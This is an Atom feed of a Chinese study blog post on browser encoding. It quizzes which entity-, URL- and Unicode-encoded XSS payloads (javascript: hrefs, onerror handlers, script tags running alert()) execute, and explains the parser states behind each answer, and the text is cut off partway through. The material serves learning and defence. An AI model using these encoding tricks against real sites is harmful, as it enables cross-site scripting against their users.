<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>MUZI&#39;s BLOG</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://muzibing.github.io/"/>
  <updated>2020-02-25T15:57:40.307Z</updated>
  <id>https://muzibing.github.io/</id>
  
  <author>
    <name>MUZIBing</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【知识点整理】 浏览器编码</title>
    <link href="https://muzibing.github.io/2020/02/24/2020.02.24%EF%BC%8895%EF%BC%89/"/>
    <id>https://muzibing.github.io/2020/02/24/2020.02.24（95）/</id>
    <published>2020-02-23T16:00:00.000Z</published>
    <updated>2020-02-25T15:57:40.307Z</updated>
    
    <content type="html"><![CDATA[<h3 id="一、判断下列语句能否成功执行"><a href="#一、判断下列语句能否成功执行" class="headerlink" title="一、判断下列语句能否成功执行"></a><font color="navy">一、判断下列语句能否成功执行</font></h3><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">Basics</span><br><span class="line"></span><br><span class="line">0x01. <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">// URL encoded "javascript:alert(1)"</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x02. <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61</span></span></span><br><span class="line"><span class="tag"><span class="string">%6c%65%72%74%28%32%29"</span>&gt;</span></span><br><span class="line">// Character entity encoded "javascript" and URL encoded "alert(2)"</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x03. <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript%3aalert(3)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">// URL encoded ":"</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x04. <span class="tag">&lt;<span class="name">div</span>&gt;</span>&amp;#60;img src=x onerror=alert(4)&amp;#62;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">// Character entity encoded <span class="tag">&lt; <span class="attr">and</span> &gt;</span></span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x05. <span class="tag">&lt;<span class="name">textarea</span>&gt;</span>&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line">// Character entity encoded <span class="tag">&lt; <span class="attr">and</span> &gt;</span></span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute AND the character entities will NOT</span><br><span class="line">be decoded either</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x06. <span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(6)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// Advanced</span><br><span class="line">0x07. <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"confirm('7&amp;#39;);"</span>&gt;</span>Button<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">// Character entity encoded '</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x08. <span class="tag">&lt;<span class="name">button</span> <span class="attr">onclick</span>=<span class="string">"confirm('8\u0027);"</span>&gt;</span>Button<span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">// Unicode escape sequence encoded '</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x09. <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116&amp;#40;&amp;#57;&amp;#41;&amp;#59</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">// Character entity encoded alert(9);</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x0A. <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074(10);</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">// Unicode Escape sequence encoded alert</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x0B. <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0031\u0029</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">// Unicode Escape sequence encoded alert(11)</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x0C. <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">\u0061\u006c\u0065\u0072\u0074(\u0031\u0032)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">// Unicode Escape sequence encoded alert and 12 </span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x0D. <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert('13\u0027)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">// Unicode escape sequence encoded '</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will NOT execute.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">0x0E. <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="actionscript">alert(<span class="string">'14\u000a'</span>)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">// escape sequence encoded line feed.</span><br><span class="line"></span><br><span class="line">// Answer: The javascript will execute.</span><br><span class="line"></span><br><span class="line">Bonus</span><br><span class="line">0x0F. <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3a;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x31;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x36;&amp;#x33;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x36;&amp;#x25;&amp;#x33;&amp;#x35;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x32;&amp;#x25;&amp;#x35;&amp;#x63;&amp;#x25;&amp;#x37;&amp;#x35;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x30;&amp;#x25;&amp;#x33;&amp;#x37;&amp;#x25;&amp;#x33;&amp;#x34;&amp;#x28;&amp;#x31;&amp;#x35;&amp;#x29;"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"></span><br><span class="line">// Answer: The javascript will execute.</span><br></pre></td></tr></table></figure><h3 id="二、相关知识"><a href="#二、相关知识" class="headerlink" title="二、相关知识"></a><font color="navy">二、相关知识</font></h3><h4 id="0x01-HTML-解析"><a href="#0x01-HTML-解析" class="headerlink" title="0x01 HTML 解析"></a>0x01 HTML 解析</h4><blockquote><font color="red">**浏览器最早开始解析HTML，将标签转化为内容树中的DOM 节点，此时识别标签的时候，HTML 解析器是无法识别那边被实体编码的内容的，即 HTML解析器 不会做解码的工作。**</font><p><strong>只有建立起DOM 树，才能对每个节点的内容进行识别，这时候如果出现实体编码，则会进行实体解码。但是这时候解析出来假如有新的标签，那么不会在加入DOM树,只是作为字符串处理。比如<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code>。</strong></p><p>并且不是所有节点内容都会进行实体解码，比如<code>&lt;script&gt;</code> 和 <code>&lt;style&gt;</code> 里面的代码<sup>0x04</sup>。</p><p>以上对于标签的识别，并不只是标签头本身，也包括其中的属性、结构等。</p></blockquote><p><code>小知识点：</code></p><ol><li><strong>script标签内无法解析HTML实体编码</strong>，因为其不是在 data state 数据段内，<code>SVG</code> 属于支持 <code>XML</code> 解析，所以那么我们就很好理解了，因为下 <code>xml</code> 支持在标签内解析 <code>HTML</code> 实体字符，所以在 <code>XML</code> 中&#40;会被解析成（</li><li>当HTML 解析器处于<code>数据状态（DataState）</code>、<code>RCDATA 状态（RCDATA State）</code>、<code>属性值状态（Attribute Value State）</code>时，字符实体会被解码为对应的字符。</li><li>在原始文本元素（<code>&lt;script&gt;</code> 和 <code>&lt;style&gt;</code>）类型标签下的所有字符实体编码都不会被 HTML 解码。</li></ol><h4 id="0x02-JavaScript-解析"><a href="#0x02-JavaScript-解析" class="headerlink" title="0x02 JavaScript 解析"></a>0x02 JavaScript 解析</h4><p><code>javascript解析器的入口：</code></p><blockquote><ul><li><strong>标签</strong></li><li><strong>onlick</strong> <strong>等事件</strong> <strong>js</strong> <strong>的动作</strong></li><li><strong>url</strong> <strong>调用</strong> <strong>javascript:</strong> <strong>伪协议</strong></li><li><strong>css</strong> <strong>调用引入文件，或</strong> <strong>url</strong> <strong>再间接引入</strong> <strong>javascript:</strong></li><li><strong>eval()</strong> <strong>调用</strong></li><li><strong>定时器触发</strong></li></ul></blockquote><p><code>Unicode转义序列出现的地方</code></p><blockquote><p>从上下文来看，可以分为三个地方：<strong>字符串中，标识符名称中和控制字符（(,),;,”,’等）中。</strong></p><ul><li>字符串中：转义序列只会被解释为正规字符，而不是单引号，双引号或者换行符这些能够打破字符串上下文的字符。</li><li>标识符名称中：转义序列会被解码并解释为标识符名称的一部分，例如函数名，属性名等等。</li><li>控制字符中：转义序列将不会被解释成控制字符，而仅仅被解码并解析为标识符名称或者字符串常量。</li></ul><p>JavaScript解析时只有<strong>标识符名称</strong>不会被当做字符串，<strong>控制字符</strong>仅会被解析为标示符名称或者字符串。</p><p>Javascript解析器工作的时候可以将\u0061\u006c\u0065\u0072\u0074进行js解码后为“alert”，而“alert”是一个有效的标识符名称，它是能被正常解析的。像圆括号、双引号、单引号等等这些控制字符，在进行JavaScript解析的时候仅会被解码为字符串文本或者上面讲的标识符名称，不能作为控制字符解析。</p></blockquote><p><code>JavaScript 解析器</code><sup>[0x04]</sup></p><blockquote><p>形如 \uXXXX 这样的 Unicode 字符转义序列或 Hex 编码是否能被解码需要看情况。 首先，JavaScript 中有三个地方可以出现 Unicode 字符转义序列：</p><p>1、字符串中（in String）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Unicode 转义序列出现在字符串中时，它只会被解释为普通字符，而不会破坏字符串的上下文。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;例如，<code>&lt;script&gt;alert(“\u0031\u0030″);&lt;/script&gt;</code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;被编码转义的部分为 10，是字符串，会被正常解码，JS 代码也会被执行。</p><p>2、标识符中（in identifier names）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;若 Unicode 转义序列存在于标识符中，即变量名（如函数名等…），它会被进行解码。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;例如，<code>&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(10);&lt;/script&gt;</code></p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;被编码转义的部分为 alert 字符，是函数名，属于在标识符中的情况，因此会被正常解码，JS 代码也会被执行。</p><p>3、控制字符中（in control characters）</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;若 Unicode 转义序列存在于控制字符中，那么它会被解码但不会被解释为控制字符，而会被解释为标识符或字符串字符的一部分。 控制字符即’、”、()等。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;例如，<code>&lt;script&gt;alert\u0028″xss”);&lt;/script&gt;</code>，(进行了 Unicode 编码，那么解码后它不再是作为控制字符，而是作为标识符的一部分alert(。</p><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;因此函数的括号之类的控制字符进行 Unicode 转义后是不能被正常解释的。</p></blockquote><p><code>例题</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(1)"</span>)&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert(\u0031)"</span>)&gt;</span>test1<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert('\u0031')"</span>)&gt;</span>test2<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:\u0061\u006c\u0065\u0072\u0074(1)"</span>)&gt;</span>test3<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:\u0061\u006c\u0065\u0072\u0074\u0028\u0031\u0029"</span>)&gt;</span>test4<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074:alert(1)"</span>)&gt;</span>test5<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript\u003aalert(1)"</span>)&gt;</span>test6<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript:alert('1\u000a')"</span>)&gt;</span>test7<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><div class="table-container"><table><thead><tr><th style="text-align:center">测试</th><th style="text-align:center">结果</th></tr></thead><tbody><tr><td style="text-align:center">test</td><td style="text-align:center">弹框</td></tr><tr><td style="text-align:center">test1</td><td style="text-align:center">失败，解析为字符串1，需要单引号<br>// 之所以添加单引号，是因为 JS 解码后的结果只能为子字符串或标识符 //</td></tr><tr><td style="text-align:center">test2</td><td style="text-align:center">弹框，编码 ‘ 则失败</td></tr><tr><td style="text-align:center">test3</td><td style="text-align:center">弹框</td></tr><tr><td style="text-align:center">test4</td><td style="text-align:center">失败，编码括号</td></tr><tr><td style="text-align:center">test5</td><td style="text-align:center">失败，URL解码时，不以javascript伪协议解析，寻找根目录下链接</td></tr><tr><td style="text-align:center">test6</td><td style="text-align:center">失败，同上，寻找相对路径链接</td></tr><tr><td style="text-align:center">test7</td><td style="text-align:center">弹框，可以添加换行符，不受影响。\u000a：换行符</td></tr></tbody></table></div><p><code>个人理解</code></p><blockquote><ul><li>javascript 解码后的结果是<code>字符串</code>或者是<code>标识符名称</code>，</li><li>控制符有 <code>(</code>、<code>)</code>、<code>;</code>、<code>&quot;</code> 和 <code>&#39;</code> 等</li></ul></blockquote><p><code>javascript 解码本质</code></p><blockquote><font color="red">**Unicode 序列不能出现在控制字符中，否则不能被解释。**</font></blockquote><h4 id="0x03-URL-解码"><a href="#0x03-URL-解码" class="headerlink" title="0x03 URL 解码"></a>0x03 URL 解码</h4><blockquote><ol><li><p><code>&lt;a href=&quot;%6A%61%76%61%73%63%72%69%70%74:%61%6C%65%72%74%28%31%29&quot;&gt;test1&lt;/a&gt;</code></p><font color="brown">URL解析过程中的一个细节：**URL 不能对协议类型进行任何的编码操作**，否则URL解析器会认为它无类型，就导致上述被编码的“javascript”没有解码，当然不会被URL解析器识别了。</font></li><li><p>src 中是可以进行 URL 编码的，当输出环境在 href     或者 src 属性内时，可通过javascript 伪协议来执行 JS 代码 。</p></li><li><p>html中的 <code>&lt;a&gt;</code> 标签的 href 属性，url 解析器会对 href 内部的内容进行一次url解析，js中的window.open(),url解析器会对括号内部的内容进行一次url解析，URL解析过程中的一个细节了，不能对伪协议类型进行任何的编码操作，否则URL解析器会认为它无类型。这个协议类型的格式是javascript:不是只是javascript。除此了javascript:伪协议可以执行js代码之外，还有IE下的vbscript,Mozilla下的dataURL(data:text/html;这里可以直接添加html的<code>&lt;script&gt;</code>标签，会执行)</p></li></ol></blockquote><p><code>小知识点：URL 的格式</code></p><p><img src="/images/95-1.png" alt></p><p><center><b>[协议名]://[用户名]:[密码]@[主机名]:[端口]/[路径]?[查询参数]#[片段 ID]</b></center></p><blockquote><ul><li><p>首先，要注意的是 URL 的 Scheme 部分（协议部分）必须为 ASCII 字符，即不能被任何编码，否则 URL 解析器的状态机将进入 No Scheme 状态。<br>示例1：<code>&lt;a href=&quot;%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29&quot;&gt;&lt;/a&gt;</code></p></li><li><p>URL 编码部分的是javascript:alert(1)，但是 JS 不会被执行，因为作为 Scheme 部分的”javascript”这个字符串被编码（其中javascript是一种伪协议），导致 URL 解析 器状态机进入 No Scheme 状态。</p></li><li>URL 中的 : （冒号）也不能被以任何方式编码，否则 URL 解析器的状态机也将进入 No Scheme 状态。<code>&lt;a href=&quot;javascript%3aalert(3)&quot;&gt;&lt;/a&gt;</code><br>由于 : (冒号)被 URL 编码为%3a，导致 URL 状态机进入 NoScheme 状态，JS 代码不能执行。</li><li>示例2：<code>&lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61%6c%65%72%74%28%32%29&quot;&gt;&lt;/a&gt;</code></li><li>“JavaScript” 这个字符串被实体化编码，: （冒号）没有被编码，alert(2) 被 URL编码，成功执行。首先，在 HTML 解析器中，HTML状态机处于属性值状态（Attribute Value State）时，字符实体时会被解码的，此处在 href 属性中，所以被实体化编码的 “javascript”字符串会被解码。其次，HTML 解析是在URL解析之前的，所以在进行 URL 解析之前，Scheme 部分的”javascript”字符串已被解码，而并不再是被实体编码的状态。</li></ul></blockquote><h4 id="0x04-相关实践"><a href="#0x04-相关实践" class="headerlink" title="0x04 相关实践"></a>0x04 相关实践</h4><p><img src="/images/95-3.png" alt></p><p><img src="/images/95-2.png" alt></p><h3 id="三、详解每条原因"><a href="#三、详解每条原因" class="headerlink" title="三、详解每条原因"></a><font color="navy">三、详解每条原因</font></h3><p><code>0x01</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不能弹出。因为 <code>“%6a%61%76%61%73%63%72%69%70%74:%61%6c%65%72%74%28%31%29”</code> 是 <code>URL</code> 编码，在 HTML 解析上述语句所得到的还是该语句本身，而 <code>URL</code> 编码在编码 <code>URL</code> 时，要求 <code>URL</code> 的 <code>Scheme</code>  部分（协议部分）必须为 <code>ASCII 字符</code>，即不能被任何编码，否则 <code>URL 解析器</code>的状态机将进入 <code>No Scheme 状态</code>。所以作为Scheme 部分的 <code>”javascript”</code> 这个字符串被编码（其中 <code>javascript</code> 是一种伪协议），导致 <code>URL 解析器</code>状态机进入 <code>No Scheme 状态</code>。</p></blockquote><p><code>0x02</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:%61</span></span></span><br><span class="line"><span class="tag"><span class="string">%6c%65%72%74%28%32%29"</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>能正常弹出。因为 <code>&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&quot;</code> 是实体编码，所以在 <code>HTML 解析器</code> 解析后，上述实体编码被解码为 <code>javascript</code>，上述语句变为<code>&lt;a href=&quot;JavaScript:%61%6c%65%72%74%28%32%29&quot;&gt;</code>，这个时候 <code>URL 解析器</code>  遇见 <code>javascript:</code> 就会对后面的 <code>URL 编码</code> 解码，变为如下语句 <code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;</code> ，所以成功弹窗。</p></blockquote><p><code>0x03</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"javascript%3aalert(3)"</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不能弹窗。虽然 <code>JavaScript</code> 没有被编码，但是 <code>URL 解析器</code> 在编码时是对 <code>javascript:</code> 识别状态，不是 <code>javascript</code>，所以 <code>URL 解析器</code>的状态机将进入 <code>No Scheme 状态</code>，所以不会弹窗。</p></blockquote><p><code>0x04</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span>&amp;#60;img src=x onerror=alert(4)&amp;#62;<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不能弹窗。</p><ul><li><p><font color="red"><strong>分析一</strong></font>：HTML 解析过程：<code>一个HTML解析器作为一个状态机，它从输入流中获取字符并按照转换规则转换到另一种状态。在解析过程中，任何时候它只要遇到一个&#39;&lt;&#39;符号（后面没有跟&#39;/&#39;符号）就会进入“标签开始状态(Tag open state)”。然后转变到“标签名状态(Tag name state)”，“前属性名状态(before attribute name state)”......最后进入“数据状态(Data state)”并释放当前标签的token。当解析器处于“数据状态(Data state)”时，它会继续解析，每当发现一个完整的标签，就会释放出一个token。这里有三种情况可以容纳字符实体，“数据状态中的字符引用”，“RCDATA 状态中的字符引用”和“属性值状态中的字符引用”。在这些状态中HTML字符实体将会从“&amp;#...”形式解码，对应的解码字符会被放入数据缓冲区中。</code>在该问题中，“<code>&lt;</code>”和“<code>&gt;</code>”字符被编码为“<code>&amp;#60;</code>”和“<code>\&amp;#62;</code>”。当解析器解析完“<code>&lt;div&gt;</code>”并处于“数据状态”时，这两个字符将会被解析。当解析器遇到“&amp;”字符，它会知道这是“数据状态的字符引用”，因此会消耗一个字符引用（例如 “<code>&amp;#60;</code>” ）并释放出对应字符的 <code>token</code>。在这个例子中，对应字符指的是 “<code>&lt;</code>” 和 “<code>&gt;</code>” 。读者可能会想：这是不是意味着“<code>&lt;</code>”和“<code>&gt;</code>”的 <code>token</code> 将会被理解为标签的开始和结束，然后其中的脚本会被执行？答案是脚本并不会被执行。原因是解析器在解析这个字符引用后不会转换到“标签开始状态”。正因为如此，就不会建立新标签。因此，我们能够利用字符实体编码这个行为来转义用户输入的数据从而确保用户输入的数据只能被解析成 “数据”。</p></li><li><p><font color="red"><strong>分析二</strong></font>：&lt;和&gt;被编码为字符实体&#60;和&#62;。 当 HTML 解析器解析完<div>时，会进入数据状态（Data State）并发布标签令牌。接着解析到实体&#60;时因为处在数据状态（Data State）就会对实体进行解码为&lt;，后面 的&#62;同样道理被解码为&gt;。因为解析器在使用字符引用后不会转换到标签打开状态（Tag OpenState），不进入标签打开状态就不会被发布为 HTML 标签。因此，不会创建新 HTML 标签， 只会将其作为数据来处理。 这也是为什么我们可以使用字符实体来避免用户不安全输入导致 XSS 的原因。</div></p></li></ul></blockquote><p><code>0x05</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span>&amp;#60;script&amp;#62;alert(5)&amp;#60;/script&amp;#62;<span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不能弹窗，但是能够被解码。因为 <code>textarea</code> 和 <code>title</code> 标签名称是 <code>RCDATA</code>  元素<sup>[0x07]</sup>，但是处于 <code>RCDATA State</code> 状态时，<font color="brown"><strong>字符实体是会被解析器解码的。</strong></font>所以上述的语句会被解码成下述语句 <code>&lt;textarea&gt;&lt;script&gt;alert(5)&lt;/script&gt;&lt;/textarea&gt;</code> ，但是里面的 JS 同样还是不会被执行，原因还是因为解码字符实体状态机不会进入<code>标签打开状态（TagOpen State）</code>，因此里面的 <code>&lt;script&gt;</code> 并不会被解析为 HTML 标签。</p><p><img src="/images/95-4.png" alt></p></blockquote><p><code>0x06</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">textarea</span>&gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined">alert(6)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>不能弹窗。和 <code>0x05</code> 的解释差不多，在 <code>RCDATA</code>元素内，字符实体状态机不会进入<code>标签打开状态（TagOpen State）</code>，因此里面的 <code>&lt;script&gt;</code> 并不会被解析为 HTML 标签。所以不会弹窗。</p><p><img src="/images/95-5.png" alt></p></blockquote><p><code>0x07</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span 